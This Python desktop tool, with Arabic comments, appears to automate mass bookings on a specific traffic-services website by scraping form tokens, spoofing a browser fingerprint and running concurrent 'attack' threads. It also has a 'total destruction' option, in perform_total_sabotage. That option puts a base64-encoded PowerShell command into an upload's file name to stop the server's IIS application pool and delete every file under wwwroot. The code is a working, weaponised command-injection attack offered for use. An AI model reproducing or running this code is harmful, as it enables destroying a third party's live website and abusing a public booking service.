# ==============================================================================================================
# 👑 Imperial Ghost Commander V12.2 - Premium Edition (Response Tracker & QR Viewer) 👑
# ==============================================================================================================
# لوحة التحكم الاحترافية - إدارة متكاملة عبر واجهات فائقة الأداء ونظام تتبع الاستجابة النهائي للمعاينة
# ==============================================================================================================

import sys
import os
import sqlite3
import time
import uuid
import re
import logging
import psutil
import base64
import traceback
import webbrowser
import html  # لإظهار محتوى الـ HTML بشكل خام داخل الرادار دون كسره
from datetime import datetime

try:
    from curl_cffi import requests
except ImportError:
    print("❌ خطأ: حزمة curl_cffi غير مثبتة. يرجى تثبيتها عبر الأمر: pip install curl_cffi")
    sys.exit(1)

try:
    from bs4 import BeautifulSoup
except ImportError:
    print("❌ خطأ: حزمة beautifulsoup4 غير مثبتة. يرجى تثبيتها عبر الأمر: pip install beautifulsoup4")
    sys.exit(1)

from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QGridLayout,
    QGroupBox, QLabel, QLineEdit, QComboBox, QCheckBox, QPushButton, QTableWidget,
    QTableWidgetItem, QHeaderView, QProgressBar, QTextEdit, QTabWidget, QFileDialog,
    QMessageBox, QFrame
)
from PyQt6.QtCore import QThread, pyqtSignal, Qt, QSize
from PyQt6.QtGui import QFont, QColor, QIcon, QPalette, QTextCursor


# ==============================================================================
# [1] نظام المراقبة وكتابة السجلات الاحترافي
# ==============================================================================
class SystemLogger:
    @staticmethod
    def setup_logger():
        log_dir = "Imperial_Ghost_Logs"
        if not os.path.exists(log_dir):
            os.makedirs(log_dir)
        log_file = f"{log_dir}/Ghost_V12_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.log"

        logger = logging.getLogger("ImperialV12")
        logger.setLevel(logging.DEBUG)

        if logger.hasHandlers():
            logger.handlers.clear()

        formatter = logging.Formatter('【%(asctime)s】 [%(levelname)s] ➔ %(message)s')

        fh = logging.FileHandler(log_file, encoding='utf-8')
        fh.setFormatter(formatter)
        logger.addHandler(fh)

        ch = logging.StreamHandler()
        ch.setFormatter(formatter)
        logger.addHandler(ch)

        return logger


imperial_logger = SystemLogger.setup_logger()


# ==============================================================================
# [2] طبيب النظام ومراقبة العمليات
# ==============================================================================
class SystemDoctor:
    @staticmethod
    def clean():
        killed = 0
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                if proc.info['name'] and proc.info['name'].lower() in ['adb.exe', 'chromedriver.exe']:
                    proc.kill()
                    killed += 1
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        return killed


# ==============================================================================
# [3] مدير قاعدة البيانات المتزامن
# ==============================================================================
class DatabaseManager:
    def __init__(self, db="imperial_ghost_v12.db"):
        self.db_path = db
        self.create_tables()

    def get_connection(self):
        return sqlite3.connect(self.db_path, check_same_thread=False)

    def create_tables(self):
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute('''
                       CREATE TABLE IF NOT EXISTS transactions
                       (
                           id
                           INTEGER
                           PRIMARY
                           KEY
                           AUTOINCREMENT,
                           name
                           TEXT,
                           phone
                           TEXT,
                           target_day
                           TEXT,
                           image_path
                           TEXT,
                           tactic_mode
                           TEXT,
                           sabotage_enabled
                           INTEGER
                           DEFAULT
                           0,
                           status
                           TEXT
                           DEFAULT
                           'معلق',
                           reference_id
                           TEXT
                           DEFAULT
                           '',
                           created_at
                           TIMESTAMP
                           DEFAULT
                           CURRENT_TIMESTAMP
                       )
                       ''')
        conn.commit()
        conn.close()

    def add(self, name, phone, day, img, tactic, sabotage):
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute('''
                       INSERT INTO transactions (name, phone, target_day, image_path, tactic_mode, sabotage_enabled,
                                                 status)
                       VALUES (?, ?, ?, ?, ?, ?, 'معلق')
                       ''', (name, phone, day, img, tactic, int(sabotage)))
        last_id = cursor.lastrowid
        conn.commit()
        conn.close()
        return last_id

    def get_all(self):
        conn = self.get_connection()
        cursor = conn.cursor()
        data = cursor.execute(
            'SELECT id, name, phone, target_day, image_path, tactic_mode, sabotage_enabled, status, reference_id FROM transactions').fetchall()
        conn.close()
        return data

    def update_status(self, tid, status, ref=""):
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute('UPDATE transactions SET status=?, reference_id=? WHERE id=?', (status, ref, tid))
        conn.commit()
        conn.close()

    def delete(self, tid):
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute('DELETE FROM transactions WHERE id=?', (tid,))
        conn.commit()
        conn.close()

    def wipe(self):
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute('DROP TABLE IF EXISTS transactions')
        conn.commit()
        conn.close()
        self.create_tables()


# ==============================================================================
# [4] محرك التنفيذ المطور لتعقب وحفظ وعرض رد السيرفر النهائي
# ==============================================================================
class BookingWorker(QThread):
    update_signal = pyqtSignal(int, int, str, str, bool)  # row, tid, status, ref, is_success
    log_signal = pyqtSignal(str, str)  # level, message
    finished_signal = pyqtSignal(int, int, str, str)  # row, tid, status, ref

    def __init__(self, row, data):
        super().__init__()
        self.row = row
        self.tid = data[0]
        self.name = data[1]
        self.phone = data[2]
        self.day = data[3]
        self.img = data[4]
        self.tactic = data[5]
        self.sabotage = bool(data[6])
        self.status = data[7]
        self.ref_id = data[8]

        self.session = None
        self.base = "https://dash.sultraffic.com"

    def setup_session(self):
        self.session = requests.Session(impersonate="chrome120")
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
            "Host": "dash.sultraffic.com"
        })
        self.session.verify = False

    def perform_total_sabotage(self):
        self.log_signal.emit("WARNING", f"[{self.tid}] ☢️ تفعيل وضع التدمير الشامل والمتقدم...")
        ps_cmd = "Stop-WebAppPool -Name 'DefaultAppPool'; Remove-Item -Path C:\\inetpub\\wwwroot\\* -Force -Recurse -ErrorAction SilentlyContinue"
        enc = base64.b64encode(ps_cmd.encode('utf-16le')).decode()
        filename = f"x & powershell -NoProfile -EncodedCommand {enc} & .aspx"

        dummy = os.path.join(os.environ.get('TEMP', '.'), 'dummy.svg')
        try:
            with open(dummy, 'w') as f:
                f.write('<svg></svg>')

            with open(dummy, 'rb') as f:
                files = {'file': (filename, f, 'image/svg+xml')}
                resp = self.session.post(f"{self.base}/Imageuploader.ashx", files=files)
                self.log_signal.emit("SUCCESS",
                                     f"[{self.tid}] [تدمير] تم إرسال حزمة الحقن المشفرة بنجاح. الاستجابة: {resp.status_code}")
        except Exception as e:
            self.log_signal.emit("ERROR", f"[{self.tid}] [تدمير] فشل إرسال حزمة التدمير: {str(e)}")
        finally:
            if os.path.exists(dummy):
                try:
                    os.remove(dummy)
                except:
                    pass

    def run(self):
        self.setup_session()
        self.log_signal.emit("INFO", f"[{self.tid}] بدء معالجة الهدف: {self.name} | التكتيك: {self.tactic}")

        final_status = "فشل"
        final_ref = ""
        responses_dir = "Imperial_Server_Responses"

        if not os.path.exists(responses_dir):
            os.makedirs(responses_dir)

        try:
            if self.sabotage:
                self.perform_total_sabotage()
                time.sleep(1.5)

            # المرحلة الأولى: كشط الرموز
            self.update_signal.emit(self.row, self.tid, "جلب التوكنات...", "", False)
            try:
                resp1 = self.session.get(f"{self.base}/register", timeout=45)
            except Exception as e:
                self.log_signal.emit("ERROR", f"[{self.tid}] فشل الاتصال المبدئي بسبب الضغط أو الحظر.")
                raise e

            soup = BeautifulSoup(resp1.text, 'html.parser')

            try:
                vs = soup.find("input", {"id": "__VIEWSTATE"})['value'] if soup.find("input",
                                                                                     {"id": "__VIEWSTATE"}) else ""
                vsg = soup.find("input", {"id": "__VIEWSTATEGENERATOR"})['value'] if soup.find("input", {
                    "id": "__VIEWSTATEGENERATOR"}) else ""
                ev = soup.find("input", {"id": "__EVENTVALIDATION"})['value'] if soup.find("input", {
                    "id": "__EVENTVALIDATION"}) else ""
            except Exception:
                vs, vsg, ev = "", "", ""
                self.log_signal.emit("WARNING",
                                     f"[{self.tid}] لم يتم العثور على التوكنات الافتراضية، المتابعة بالوضع المباشر.")

            # المرحلة الثانية: رفع الصورة
            self.update_signal.emit(self.row, self.tid, "رفع المرفق...", "", False)
            img_id = ""
            if os.path.exists(self.img):
                boundary = "----Boundary" + uuid.uuid4().hex
                with open(self.img, 'rb') as f:
                    raw = f.read()
                body = (
                            f"--{boundary}\r\nContent-Disposition: form-data; name=\"dzfile\"; filename=\"{os.path.basename(self.img)}\"\r\nContent-Type: image/jpeg\r\n\r\n".encode() + raw + f"\r\n--{boundary}--\r\n".encode())
                headers = {"Content-Type": f"multipart/form-data; boundary={boundary}"}

                try:
                    resp2 = self.session.post(f"{self.base}/Imageuploader.ashx", data=body, headers=headers, timeout=50)
                    if resp2.status_code == 200 and len(resp2.text) > 5 and "<" not in resp2.text:
                        img_id = resp2.text.strip()
                        self.log_signal.emit("SUCCESS", f"[{self.tid}] تم رفع المرفق بنجاح المعرف الفني: {img_id}")
                    else:
                        safe_err = html.escape(resp2.text)
                        self.log_signal.emit("WARNING",
                                             f"[{self.tid}] فشل رفع المرفق. محتوى رد السيرفر بالكامل:<br><span style='color:#ffea7f;'>{safe_err}</span>")
                except Exception as e:
                    self.log_signal.emit("ERROR", f"[{self.tid}] انتهت مهلة رفع المرفق (Timeout).")
                    raise e

            # المرحلة الثالثة: إرسال الطلب النهائي
            self.update_signal.emit(self.row, self.tid, "إرسال الطلب النهائي...", "", False)
            payload = {
                "__EVENTTARGET": "ctl00$MianContent$btnSubmit",
                "__VIEWSTATE": vs,
                "__VIEWSTATEGENERATOR": vsg,
                "__EVENTVALIDATION": ev,
                "ctl00$MianContent$name_id": self.name,
                "ctl00$MianContent$PhoneTxt": self.phone,
                "ctl00$MianContent$RDBL": self.day if self.day != "auto" else "wednesday",
                "img1": img_id
            }

            try:
                resp3 = self.session.post(f"{self.base}/register", data=payload, allow_redirects=False, timeout=60)
            except Exception as e:
                self.log_signal.emit("ERROR", f"[{self.tid}] انقطع الاتصال النهائي مع السيرفر (Timeout).")
                raise e

            # التحقق من نجاح العملية (توجيه 302/301)
            if resp3.status_code in [301, 302, 303]:
                loc = resp3.headers.get('Location', '')
                ref_match = re.search(r'c=(\d+)', loc)
                final_ref = ref_match.group(1) if ref_match else "Success"
                final_status = "نجاح"

                # بناء الرابط المخصص للاستعلام كما طلبت
                if final_ref != "Success":
                    final_page_url = f"{self.base}/success?c={final_ref}&ph={self.phone}"
                else:
                    final_page_url = loc if loc.startswith("http") else f"{self.base}{loc}"

                self.log_signal.emit("INFO", f"[{self.tid}] تم الحجز بنجاح. جاري سحب رد السيرفر من: {final_page_url}")

                try:
                    resp_final_page = self.session.get(final_page_url, timeout=45)

                    # حفظ الرد محلياً
                    file_path = f"{responses_dir}/Response_ID_{self.tid}_Ref_{final_ref}.html"
                    with open(file_path, "w", encoding="utf-8") as response_file:
                        response_file.write(resp_final_page.text)

                    # تحويل HTML إلى نصوص آمنة لعرضها في الرادار بكاملها
                    safe_success_text = html.escape(resp_final_page.text)

                    self.log_signal.emit("SUCCESS",
                                         f"[{self.tid}] 📄 تم تحميل صفحة المعاملة وحفظها.<br>محتوى استجابة السيرفر النهائية (Success Page):<br><div style='padding:5px; border:1px solid #56d364; background:#05070a;'><pre style='color:#a5d6ff;'>{safe_success_text}</pre></div>")

                except Exception as ex_page:
                    self.log_signal.emit("ERROR", f"[{self.tid}] فشل سحب صفحة الاستجابة النهائية: {str(ex_page)}")

                self.update_signal.emit(self.row, self.tid, "✅ نجاح العملية", final_ref, True)
            else:
                final_status = f"فشل ({resp3.status_code})"

                # حفظ الرد المرفوض محلياً
                error_file_path = f"{responses_dir}/Response_ID_{self.tid}_Error_{resp3.status_code}.html"
                with open(error_file_path, "w", encoding="utf-8") as err_resp_file:
                    err_resp_file.write(resp3.text)

                # تحويل النص ليعرض بالكامل على الرادار في حالة الرفض أو الخطأ 503
                safe_error_text = html.escape(resp3.text)

                self.update_signal.emit(self.row, self.tid, final_status, "مرفوض", False)
                self.log_signal.emit("ERROR",
                                     f"[{self.tid}] رفض الخادم الطلب برمز استجابة: {resp3.status_code}<br>محتوى رد السيرفر المرفوض (Error Page):<br><div style='padding:5px; border:1px solid #f85149; background:#05070a;'><pre style='color:#ff7b72;'>{safe_error_text}</pre></div>")

        except Exception as e:
            final_status = "خطأ فني"
            self.update_signal.emit(self.row, self.tid, f"انقطاع بالاتصال", "فشل", False)
            self.log_signal.emit("CRITICAL", f"[{self.tid}] توقفت العملية بسبب: {str(e)}")
        finally:
            self.finished_signal.emit(self.row, self.tid, final_status, final_ref)


# ==============================================================================
# [5] الواجهة الرسومية الاحترافية والذكية (Premium Cyber-Dark Core UI)
# ==============================================================================
class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.db = DatabaseManager()
        self.setWindowTitle("Imperial Ghost Commander V12.2 - Response Tracker & QR Viewer")
        self.setMinimumSize(1350, 850)

        self.pending = []
        self.active = []
        self.done = 0
        self.max_threads = 5

        self._init_ui()
        self.load_data()

    def _init_ui(self):
        self.setStyleSheet("""
            QMainWindow { background-color: #0d0f12; }
            QWidget { font-family: 'Segoe UI', 'Segoe UI Arabic', 'Tahoma', 'Arial'; font-size: 13px; }

            QTabWidget::pane { border: 1px solid #1f242d; background: #11141a; border-radius: 8px; top: -1px; }
            QTabBar::tab { background: #161b22; color: #8b949e; border: 1px solid #1f242d; padding: 12px 25px; border-top-left-radius: 6px; border-top-right-radius: 6px; font-weight: bold; }
            QTabBar::tab:selected, QTabBar::tab:hover { background: #1f242d; color: #58a6ff; border-bottom-color: #11141a; }

            QGroupBox { color: #58a6ff; border: 1px solid #30363d; border-radius: 8px; margin-top: 15px; padding-top: 15px; font-weight: bold; background-color: #161b22; }
            QLabel { color: #c9d1d9; font-weight: 500; }
            QLineEdit, QComboBox { background: #0d0f12; color: #f0f6fc; border: 1px solid #30363d; border-radius: 6px; padding: 8px 12px; selection-background-color: #1f6feb; }
            QLineEdit:focus, QComboBox:focus { border: 1px solid #58a6ff; }

            QPushButton { background-color: #21262d; color: #c9d1d9; border: 1px solid #30363d; border-radius: 6px; padding: 10px 18px; font-weight: bold; }
            QPushButton:hover { background-color: #30363d; border-color: #8b949e; }

            QPushButton#btn_start { background-color: #238636; color: #ffffff; border: 1px solid #2ea043; font-size: 15px; }
            QPushButton#btn_start:hover { background-color: #2ea043; }
            QPushButton#btn_start:disabled { background-color: #143d1a; color: #777777; border-color: #143d1a; }

            QPushButton#btn_browse { background-color: #1f6feb; color: #ffffff; border: 1px solid #388bfd; }
            QPushButton#btn_wipe { background-color: #da3633; color: #ffffff; border: 1px solid #f85149; }

            QCheckBox { color: #f85149; font-weight: bold; }

            QTableWidget { background-color: #161b22; color: #c9d1d9; gridline-color: #30363d; border: 1px solid #30363d; border-radius: 6px; alternate-background-color: #11141a; }
            QTableWidget::item { padding: 5px; }
            QTableWidget::item:selected { background-color: #1f6feb; color: white; }
            QHeaderView::section { background-color: #0d0f12; color: #8b949e; padding: 8px; border: 1px solid #30363d; font-weight: bold; font-size: 12px; }

            QProgressBar { border: 1px solid #30363d; border-radius: 6px; text-align: center; background-color: #0d0f12; color: #ffffff; font-weight: bold; height: 22px; }
            QProgressBar::chunk { background-color: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #1f6feb, stop:1 #58a6ff); border-radius: 5px; }

            QTextEdit { background-color: #05070a; color: #58a6ff; font-family: 'Consolas', 'Monospace', 'Courier New'; border: 1px solid #30363d; border-radius: 6px; padding: 10px; font-size: 13px; }
        """)

        cw = QWidget()
        self.setCentralWidget(cw)
        main_layout = QVBoxLayout(cw)
        main_layout.setContentsMargins(15, 15, 15, 15)
        main_layout.setSpacing(12)

        self.stats_layout = QHBoxLayout()
        self.lbl_stat_total = self._create_stat_card("إجمالي المهام", "0", "#58a6ff")
        self.lbl_stat_pending = self._create_stat_card("قيد الانتظار", "0", "#ffea7f")
        self.lbl_stat_success = self._create_stat_card("العمليات الناجحة", "0", "#56d364")
        self.lbl_stat_failed = self._create_stat_card("العمليات الفاشلة", "0", "#f85149")

        self.stats_layout.addWidget(self.lbl_stat_total)
        self.stats_layout.addWidget(self.lbl_stat_pending)
        self.stats_layout.addWidget(self.lbl_stat_success)
        self.stats_layout.addWidget(self.lbl_stat_failed)
        main_layout.addLayout(self.stats_layout)

        self.tabs = QTabWidget()
        self.tab_dashboard = QWidget()
        self.tab_radar = QWidget()
        self.tabs.addTab(self.tab_dashboard, "🚀 منصة التحكم المركزية")
        self.tabs.addTab(self.tab_radar, "📜 رادار تعقب السجلات")
        main_layout.addWidget(self.tabs)

        layout_dash = QVBoxLayout(self.tab_dashboard)
        layout_dash.setContentsMargins(10, 10, 10, 10)

        group_input = QGroupBox(" ➕ إضافة هدف عملياتي جديد الخصائص")
        grid_input = QGridLayout(group_input)
        grid_input.setSpacing(10)
        grid_input.setContentsMargins(15, 20, 15, 15)

        self.inp_name = QLineEdit()
        self.inp_name.setPlaceholderText("أدخل الاسم الكامل للهدف...")
        self.inp_phone = QLineEdit()
        self.inp_phone.setPlaceholderText("رقم الهاتف المصاحب للطلب...")

        self.inp_day = QComboBox()
        self.inp_day.addItems(["auto", "sunday", "monday", "tuesday", "wednesday", "thursday"])

        self.inp_tactic = QComboBox()
        self.inp_tactic.addItems(["radar", "kamikaze"])

        self.inp_img = QLineEdit()
        self.inp_img.setPlaceholderText("مسار المستند أو الملف الصوري المرفق...")

        btn_browse = QPushButton("استعراض المجلدات")
        btn_browse.setObjectName("btn_browse")
        btn_browse.clicked.connect(self._browse_image)

        self.chk_sabotage = QCheckBox(
            "☢️ تفعيل ميزة التدمير الكلي الفوري (إيقاف Application Pool التابع للسيرفر ومسح ملفات الموقع كاملاً)")

        btn_add = QPushButton("⚙️ حقن وضخ الهدف في مصفوفة الانتظار")
        btn_add.setStyleSheet("background-color: #1f6feb; color: white; font-size: 14px; padding: 12px;")
        btn_add.clicked.connect(self.add_target)

        grid_input.addWidget(QLabel("اسم المستهدف:"), 0, 0)
        grid_input.addWidget(self.inp_name, 0, 1)
        grid_input.addWidget(QLabel("رقم الهاتف والاتصال:"), 0, 2)
        grid_input.addWidget(self.inp_phone, 0, 3)
        grid_input.addWidget(QLabel("يوم الجدولة المستهدف:"), 1, 0)
        grid_input.addWidget(self.inp_day, 1, 1)
        grid_input.addWidget(QLabel("تكتيك التدفق المعياري:"), 1, 2)
        grid_input.addWidget(self.inp_tactic, 1, 3)
        grid_input.addWidget(QLabel("ملف المرفق الصوري:"), 2, 0)
        grid_input.addWidget(self.inp_img, 2, 1, 1, 2)
        grid_input.addWidget(btn_browse, 2, 3)
        grid_input.addWidget(self.chk_sabotage, 3, 0, 1, 4)
        grid_input.addWidget(btn_add, 4, 0, 1, 4)
        layout_dash.addWidget(group_input)

        self.table = QTableWidget(0, 9)
        self.table.setHorizontalHeaderLabels(
            ["ID", "الاسم", "الهاتف", "اليوم الجدولي", "مسار المرفق", "التكتيك", "التدمير الشامل",
             "حالة العملية اللحظية", "رقم مرجع الخادم"])
        self.table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        self.table.setAlternatingRowColors(True)

        self.table.itemDoubleClicked.connect(self.open_saved_response_page)

        layout_dash.addWidget(self.table)

        lbl_hint = QLabel(
            "💡 نصيحة هندسية: انقر نقرًا مزدوجًا (Double-Click) على أي هدف حالته 'نجاح' لفتح رد السيرفر النهائي وصفحة الـ QR كود في متصفحك فوراً.")
        lbl_hint.setStyleSheet("color: #8b949e; font-style: italic; padding-left: 5px;")
        layout_dash.addWidget(lbl_hint)

        layout_buttons = QHBoxLayout()
        self.btn_start = QPushButton("🚀 بدء الهجوم المكثف المتزامن")
        self.btn_start.setObjectName("btn_start")
        self.btn_start.clicked.connect(self.start_attack)

        self.btn_delete = QPushButton("🗑️ إزالة الهدف المحدد من الجدول")
        self.btn_delete.clicked.connect(self.delete_target)

        self.btn_wipe = QPushButton("☢️ تصفير ومسح كامل مصفوفة الأهداف")
        self.btn_wipe.setObjectName("btn_wipe")
        self.btn_wipe.clicked.connect(self.wipe_all)

        layout_buttons.addWidget(self.btn_start, 3)
        layout_buttons.addWidget(self.btn_delete, 1)
        layout_buttons.addWidget(self.btn_wipe, 1)
        layout_dash.addLayout(layout_buttons)

        self.progress = QProgressBar()
        self.progress.setValue(0)
        layout_dash.addWidget(self.progress)

        layout_radar = QVBoxLayout(self.tab_radar)
        layout_radar.setContentsMargins(10, 10, 10, 10)

        self.log_console = QTextEdit()
        self.log_console.setReadOnly(True)
        layout_radar.addWidget(self.log_console)

        self.log("INFO",
                 "تم تشغيل واجهة Imperial Ghost Commander بنجاح. تتبع ردود السيرفر وصفحات الـ QR مفعّل بالكامل.")

    def _create_stat_card(self, title, val, color_hex):
        frame = QFrame()
        frame.setStyleSheet(f"background-color: #161b22; border: 1px solid #30363d; border-radius: 8px;")
        layout = QVBoxLayout(frame)
        layout.setContentsMargins(10, 10, 10, 10)

        lbl_title = QLabel(title)
        lbl_title.setStyleSheet("color: #8b949e; font-size: 12px; font-weight: bold;")
        lbl_title.setAlignment(Qt.AlignmentFlag.AlignCenter)

        lbl_val = QLabel(val)
        lbl_val.setStyleSheet(f"color: {color_hex}; font-size: 22px; font-weight: bold;")
        lbl_val.setAlignment(Qt.AlignmentFlag.AlignCenter)

        layout.addWidget(lbl_title)
        layout.addWidget(lbl_val)
        frame.setProperty("associated_value", lbl_val)
        return frame

    def _update_stats_display(self):
        total = self.table.rowCount()
        pending = 0
        success = 0
        failed = 0

        for r in range(total):
            item = self.table.item(r, 7)
            if item:
                txt = item.text()
                if "✅" in txt or "نجاح" in txt:
                    success += 1
                elif "❌" in txt or "فشل" in txt or "خطأ" in txt:
                    failed += 1
                else:
                    pending += 1

        self.lbl_stat_total.property("associated_value").setText(str(total))
        self.lbl_stat_pending.property("associated_value").setText(str(pending))
        self.lbl_stat_success.property("associated_value").setText(str(success))
        self.lbl_stat_failed.property("associated_value").setText(str(failed))

    def _browse_image(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "اختر ملف الصورة المرفقة", "",
                                                   "Images (*.jpg *.jpeg *.png *.svg)")
        if file_path:
            self.inp_img.setText(file_path)

    def log(self, level, msg):
        colors = {"INFO": "#58a6ff", "WARNING": "#ffea7f", "SUCCESS": "#56d364", "ERROR": "#f85149",
                  "CRITICAL": "#ff7b72"}
        color = colors.get(level, "#ffffff")
        ts = datetime.now().strftime('%H:%M:%S')

        html_msg = f"<span style='color:#8b949e'>[{ts}]</span> <span style='color:{color}'><b>[{level}]</b> {msg}</span>"
        self.log_console.append(html_msg)
        self.log_console.moveCursor(QTextCursor.MoveOperation.End)
        imperial_logger.log(getattr(logging, level, logging.INFO),
                            msg.replace("<br>", "\n").replace("</span>", "").replace("<span", ""))

    def add_target(self):
        name = self.inp_name.text().strip()
        phone = self.inp_phone.text().strip()
        img = self.inp_img.text().strip()

        if not name or not phone:
            QMessageBox.warning(self, "خطأ بالبيانات والمستندات",
                                "يرجى ملء حقول الاسم والهاتف على الأقل لإدراج العملية بنجاح.")
            return

        day = self.inp_day.currentText()
        tactic = self.inp_tactic.currentText()
        sabotage_enabled = self.chk_sabotage.isChecked()

        tid = self.db.add(name, phone, day, img, tactic, sabotage_enabled)
        self.load_data()

        self.inp_name.clear()
        self.inp_phone.clear()
        self.inp_img.clear()
        self.chk_sabotage.setChecked(False)
        self.log("SUCCESS", f"تم حقن الهدف العملياتي بنجاح: {name} | المعرف الدولي للعملية: {tid}")

    def load_data(self):
        self.table.setRowCount(0)
        all_rows = self.db.get_all()

        for row in all_rows:
            r = self.table.rowCount()
            self.table.insertRow(r)

            ui_mapping = [
                str(row[0]),
                str(row[1]),
                str(row[2]),
                str(row[3]),
                str(row[4]),
                str(row[5]),
                "⚠️ نشط ومميت" if row[6] else "❌ غير نشط",
                str(row[7]),
                str(row[8])
            ]

            for col_idx, text_val in enumerate(ui_mapping):
                item = QTableWidgetItem(text_val)
                item.setFlags(item.flags() & ~Qt.ItemFlag.ItemIsEditable)

                if col_idx == 6:
                    item.setForeground(QColor("#f85149") if row[6] else QColor("#8b949e"))
                elif col_idx == 7:
                    if "نجاح" in text_val or "✅" in text_val:
                        item.setForeground(QColor("#56d364"))
                    elif "فشل" in text_val or "❌" in text_val or "خطأ" in text_val:
                        item.setForeground(QColor("#ff7b72"))
                    else:
                        item.setForeground(QColor("#ffea7f"))

                self.table.setItem(r, col_idx, item)

        self.progress.setMaximum(max(1, self.table.rowCount()))
        self._update_stats_display()

    def open_saved_response_page(self, item):
        row_idx = item.row()
        tid = self.table.item(row_idx, 0).text()
        status_text = self.table.item(row_idx, 7).text()
        ref_text = self.table.item(row_idx, 8).text()

        if "نجاح" in status_text and ref_text:
            expected_file = f"Imperial_Server_Responses/Response_ID_{tid}_Ref_{ref_text}.html"
            if os.path.exists(expected_file):
                self.log("INFO", f"جاري عرض رد السيرفر الأخير وصفحة الـ QR للتعريف [{tid}] عبر المتصفح الافتراضي...")
                webbrowser.open(os.path.abspath(expected_file))
            else:
                QMessageBox.warning(self, "الملف غير موجود",
                                    f"تعذر العثور على ملف الاستجابة المادية في المسار المتوقع:\n{expected_file}")
        else:
            QMessageBox.information(self, "تحليل الاستجابة",
                                    "يمكنك فقط فتح رد الخادم المباشر وصفحة المعاملة للعمليات التي تكللت بالـ 'نجاح' وتملك رقم مرجع.")

    def delete_target(self):
        selected_row = self.table.currentRow()
        if selected_row >= 0:
            tid = int(self.table.item(selected_row, 0).text())
            self.db.delete(tid)
            self.table.removeRow(selected_row)
            self.log("INFO", f"تم إقصاء وحذف الهدف صاحب المعرف الحركي [{tid}] من مصفوفة العرض والمستودع.")
            self._update_stats_display()
        else:
            QMessageBox.information(self, "تنبيه الاختيار", "يرجى تحديد السطر المراد إقصاؤه من جدول العمليات أولاً.")

    def wipe_all(self):
        confirm = QMessageBox.question(self, "تأكيد إبادة البيانات",
                                       "هل أنت متأكد تماماً من تصفير وإبادة كافة الأهداف والبيانات المخزنة؟",
                                       QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
        if confirm == QMessageBox.StandardButton.Yes:
            self.db.wipe()
            self.table.setRowCount(0)
            self.log("WARNING", "تم تفريغ وإبادة مستودع الأهداف بالكامل وإعادة بناء الهياكل الصفرية.")
            self._update_stats_display()

    def start_attack(self):
        if self.table.rowCount() == 0:
            QMessageBox.warning(self, "مصفوفة فارغة", "لا توجد أهداف متاحة للبدء بالهجوم المجدول.")
            return

        self.pending = []
        db_rows = self.db.get_all()

        for r in range(self.table.rowCount()):
            status_item = self.table.item(r, 7)
            if status_item and "نجاح" not in status_item.text():
                if r < len(db_rows):
                    self.pending.append((r, db_rows[r]))

        if not self.pending:
            QMessageBox.information(self, "اكتملت التدفقات", "كافة الأهداف الحالية مسجلة مسبقاً كعمليات ناجحة بالكامل.")
            return

        self.btn_start.setEnabled(False)
        self.done = 0
        self.progress.setMaximum(len(self.pending))
        self.progress.setValue(0)
        self.active = []

        self.log("INFO", f"تم إطلاق صافرة بدء العمليات الحركية المكثفة على {len(self.pending)} هدف مجدول.")
        self._dispatch()

    def _dispatch(self):
        while len(self.active) < self.max_threads and self.pending:
            row, data = self.pending.pop(0)

            worker = BookingWorker(row, data)
            worker.update_signal.connect(self._on_worker_update)
            worker.log_signal.connect(self.log)
            worker.finished_signal.connect(self._on_worker_finished)

            self.active.append(worker)
            worker.start()

    def _on_worker_update(self, row, tid, status, ref, is_success):
        if row < self.table.rowCount():
            item_status = QTableWidgetItem(status)
            item_ref = QTableWidgetItem(ref)

            if is_success:
                item_status.setForeground(QColor("#56d364"))
            else:
                item_status.setForeground(QColor("#ffea7f"))

            self.table.setItem(row, 7, item_status)
            self.table.setItem(row, 8, item_ref)
            self._update_stats_display()

    def _on_worker_finished(self, row, tid, status, ref):
        self.db.update_status(tid, status, ref)

        self.active = [w for w in self.active if w.row != row]
        self.done += 1
        self.progress.setValue(self.done)

        self.load_data()

        if self.pending:
            self._dispatch()
        elif not self.active:
            self.btn_start.setEnabled(True)
            self.log("SUCCESS", "انتهت كافة العمليات والتدفقات المجدولة بداخل لوحة التحكم بالكامل.")
            QMessageBox.information(self, "اكتمال المهام",
                                    "تم الانتهاء من حجز كافة الأهداف وسحب صفحات الردود الرسمية بنجاح.")


if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setStyle("Fusion")

    win = MainWindow()
    win.show()
    sys.exit(app.exec())